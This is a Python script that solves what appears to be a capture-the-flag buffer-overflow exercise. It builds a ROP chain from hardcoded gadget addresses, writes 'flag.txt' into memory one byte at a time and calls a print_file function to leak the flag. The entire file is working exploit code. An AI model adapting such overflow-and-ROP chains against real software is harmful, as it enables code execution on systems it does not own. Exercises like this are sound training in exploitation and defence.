#!/usr/bin/python3

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, 8)
PACKS = lambda s: bytes(s + (((len(s) & ~7) + 8) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

BSS = 0x601038
PRINT_FILE = 0x400510
XLAT_DS_RBX = 0x400628
POP_RDX_RCX_ADD3EF2_BEXTR = 0x40062a
STOS_ES_RDI_AL = 0x400639
POP_RDI = 0x4006a3

WRITE_RBX = lambda x: PACKP(POP_RDX_RCX_ADD3EF2_BEXTR) + PACKP(0x4000) + PACKP(x - 0x3ef2)
MOV_AL_EDI = PACKP(STOS_ES_RDI_AL)

RAX = 0xb

FLAG = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x4003d5, 0x400246, 0x4003d5]

rop = b" " * 40
rop += PACKP(POP_RDI) + PACKP(BSS)

for i, c in enumerate("flag.txt"):
    if i >= len(FLAG):
        break ;
    letter = FLAG[i]
    rop += WRITE_RBX(letter - RAX)
    RAX = ord(c)
    rop += PACKP(XLAT_DS_RBX)
    rop += MOV_AL_EDI

rop += PACKP(POP_RDI) + PACKP(BSS)
rop += PACKP(PRINT_FILE)

echo(rop)
